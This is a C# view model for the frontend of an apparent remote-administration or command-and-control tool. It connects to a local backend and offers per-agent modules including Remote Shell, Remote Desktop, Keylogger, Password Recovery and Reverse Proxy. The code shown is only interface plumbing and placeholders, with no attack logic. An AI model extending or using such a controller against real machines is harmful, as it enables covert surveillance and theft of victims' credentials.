using System;
using System.Collections.ObjectModel;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Input;
using rslm_frontend.Models;
using rslm_frontend.Services;

namespace rslm_frontend.ViewModels
{
    public class MainViewModel : ViewModelBase
    {
        private string _statusText;
        private string _statusLineColumn;
        private string _statusEncoding;
        private bool _isServerRunning;
        private RslmTcpClient _tcpClient;
        private string _selectedAgentId;

        public MainViewModel()
        {
            _tcpClient = new RslmTcpClient("127.0.0.1", 4782);
            _tcpClient.AgentConnected += OnAgentConnected;

            Documents = new ObservableCollection<DocumentModel>();
            Explorer = new ExplorerViewModel(this);
            Properties = new PropertiesViewModel();
            Resources = new ResourcesViewModel();
            Output = new OutputViewModel();

            // Init Explorer avec vrais agents
            RefreshExplorer();

            StartServerCommand = new RelayCommand(_ => StartServer(), _ => !IsServerRunning);
            StopServerCommand = new RelayCommand(_ => StopServer(), _ => IsServerRunning);
            FileManagerCommand = new RelayCommand(_ => OpenModule("File Manager"));
            RemoteShellCommand = new RelayCommand(_ => OpenModule("Remote Shell"));
            RemoteDesktopCommand = new RelayCommand(_ => OpenModule("Remote Desktop"));
            KeyloggerCommand = new RelayCommand(_ => OpenModule("Keylogger"));
            PasswordRecoveryCommand = new RelayCommand(_ => OpenModule("Password Recovery"));
            RegistryEditorCommand = new RelayCommand(_ => OpenModule("Registry Editor"));
            TaskManagerCommand = new RelayCommand(_ => OpenModule("Task Manager"));
            ReverseProxyCommand = new RelayCommand(_ => OpenModule("Reverse Proxy"));
            SystemInfoCommand = new RelayCommand(_ => OpenModule("System Info"));
            SettingsCommand = new RelayCommand(_ => OpenSettings());
            ClearOutputCommand = new RelayCommand(_ => Output.Clear());

            StatusText = "Ready";
            StatusLineColumn = "Server: Stopped";
            StatusEncoding = "Port: 4782";
        }

        public ObservableCollection<DocumentModel> Documents { get; }
        public ExplorerViewModel Explorer { get; }
        public PropertiesViewModel Properties { get; }
        public ResourcesViewModel Resources { get; }
        public OutputViewModel Output { get; }

        public string StatusText { get => _statusText; set => SetProperty(ref _statusText, value); }
        public string StatusLineColumn { get => _statusLineColumn; set => SetProperty(ref _statusLineColumn, value); }
        public string StatusEncoding { get => _statusEncoding; set => SetProperty(ref _statusEncoding, value); }

        public bool IsServerRunning
        {
            get => _isServerRunning;
            set
            {
                if (SetProperty(ref _isServerRunning, value))
                {
                    ((RelayCommand)StartServerCommand).RaiseCanExecuteChanged();
                    ((RelayCommand)StopServerCommand).RaiseCanExecuteChanged();
                }
            }
        }

        public ICommand StartServerCommand { get; }
        public ICommand StopServerCommand { get; }
        public ICommand FileManagerCommand { get; }
        public ICommand RemoteShellCommand { get; }
        public ICommand RemoteDesktopCommand { get; }
        public ICommand KeyloggerCommand { get; }
        public ICommand PasswordRecoveryCommand { get; }
        public ICommand RegistryEditorCommand { get; }
        public ICommand TaskManagerCommand { get; }
        public ICommand ReverseProxyCommand { get; }
        public ICommand SystemInfoCommand { get; }
        public ICommand SettingsCommand { get; }
        public ICommand ClearOutputCommand { get; }

        public event Action<DocumentModel> DocumentOpened;
        public event Action<DocumentModel> DocumentClosed;
        public event Action<DocumentModel> DocumentActivated;

        public RslmTcpClient TcpClient => _tcpClient;

        public string SelectedAgentId
        {
            get => _selectedAgentId;
            set
            {
                if (SetProperty(ref _selectedAgentId, value))
                    UpdateAllModuleTargets();
            }
        }

        private void RefreshExplorer()
        {
            Explorer.Nodes.Clear();
            foreach (var node in ExplorerDataService.CreateRootAssemblies())
                Explorer.Nodes.Add(node);
            foreach (var agent in ExplorerDataService.GetAgents())
                Explorer.Nodes.Add(agent);
        }

        private void UpdateAllModuleTargets()
        {
            foreach (var doc in Documents)
            {
                if (doc.ModuleViewModel is RemoteShellViewModel shellVm)
                    shellVm.TargetAgentId = _selectedAgentId;
                else if (doc.ModuleViewModel is RemoteDesktopViewModel rdVm)
                    rdVm.TargetAgentId = _selectedAgentId;
            }
        }

        public async Task<string> SendToBackend(string module, string action, string target = "", string data = "")
        {
            var result = await _tcpClient.SendCommandAsync(module, action, target, data);
            AppendLog(module, $"Sent: {action}");
            return result;
        }

        private async void StartServer()
        {
            IsServerRunning = true;
            StatusText = "Connecting...";
            AppendLog("Server", "Connecting to 127.0.0.1:4782...");

            var connected = await _tcpClient.ConnectAsync();
            if (connected)
            {
                StatusText = "Connected";
                StatusLineColumn = "Server: Connected";
                AppendLog("Server", "Connected to C++ backend.");
            }
            else
            {
                IsServerRunning = false;
                StatusText = "Connection failed";
                StatusLineColumn = "Server: Offline";
                AppendLog("Server", "Failed to connect.");
            }
        }

        private void StopServer()
        {
            IsServerRunning = false;
            _tcpClient.Disconnect();
            StatusText = "Disconnected";
            StatusLineColumn = "Server: Stopped";
            AppendLog("Server", "Disconnected.");
        }

        public void OpenModule(string moduleName)
        {
            var existing = Documents.FirstOrDefault(d => d.Title == moduleName);
            if (existing != null)
            {
                ActivateDocument(existing);
                return;
            }

            var document = CreateModuleDocument(moduleName);
            foreach (var doc in Documents) doc.IsSelected = false;
            Documents.Add(document);
            StatusText = "Opened " + moduleName;
            AppendLog("Module", "Opened: " + moduleName);
            DocumentOpened?.Invoke(document);
        }

        private DocumentModel CreateModuleDocument(string moduleName)
        {
            var document = new DocumentModel
            {
                Title = moduleName,
                ContentId = moduleName,
                IsSelected = true,
                ModuleKey = moduleName,
                Content = GetModulePlaceholder(moduleName)
            };

            if (moduleName == "Remote Desktop")
            {
                var rdVm = new RemoteDesktopViewModel(_tcpClient, SelectedAgentId, AppendLog);
                document.ModuleViewModel = rdVm;
            }
            else if (moduleName == "Remote Shell")
            {
                var shellVm = new RemoteShellViewModel(_tcpClient, SelectedAgentId, AppendLog);
                document.ModuleViewModel = shellVm;
            }

            return document;
        }

        private void OnAgentConnected(string agentId, string tag)
        {
            if (string.IsNullOrEmpty(SelectedAgentId))
                SelectedAgentId = agentId;

            ExplorerDataService.AddAgent(agentId, tag);
            RefreshExplorer();

            AppendLog("Server", $"Agent connected: {agentId} ({tag})");
            StatusEncoding = "Agent: " + agentId;
        }

        private string GetModulePlaceholder(string module)
        {
            switch (module)
            {
                case "Remote Shell": return "Connecting to shell...";
                case "File Manager": return "File Manager - Select a client.";
                case "Remote Desktop": return "Remote Desktop - Select a client.";
                default: return "Module: " + module;
            }
        }

        public void OpenDocument(ExplorerNode node)
        {
            if (node == null) return;
            if (node.FullName.Contains("/"))
            {
                var parts = node.FullName.Split('/');
                SelectedAgentId = parts[0];
                OpenModule(parts[1]);
                return;
            }
            SelectedAgentId = node.FullName;
            AppendLog("Explorer", "Selected agent: " + node.FullName);
        }

        public void CloseDocument(DocumentModel document)
        {
            if (document == null) return;
            Documents.Remove(document);
            DocumentClosed?.Invoke(document);
            if (Documents.Count > 0) ActivateDocument(Documents.Last());
            else StatusText = "Ready";
        }

        public void ActivateDocument(DocumentModel document)
        {
            if (document == null) return;
            foreach (var doc in Documents) doc.IsSelected = doc == document;
            StatusText = document.Title;
            DocumentActivated?.Invoke(document);
        }

        public void UpdatePropertiesForNode(ExplorerNode node) => Properties.SetPropertiesForNode(node);
        public void AppendLog(string source, string message) => Output.Append(source, message);

        private void OpenSettings()
        {
            AppendLog("Settings", "Settings opened.");
            StatusText = "Settings";
        }
    }
}